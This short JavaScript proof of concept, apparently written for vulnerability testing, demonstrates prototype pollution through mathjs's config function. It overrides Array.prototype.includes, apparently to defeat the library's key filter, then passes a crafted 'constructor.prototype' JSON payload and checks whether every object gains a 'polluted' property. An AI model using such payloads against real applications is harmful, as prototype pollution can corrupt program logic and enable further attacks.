Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var mathMod = require('mathjs');
const mathjs = mathMod.create(mathMod.all);
console.log({}.polluted);
const newConfig = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
mathjs.config(newConfig);
console.log({}.polluted);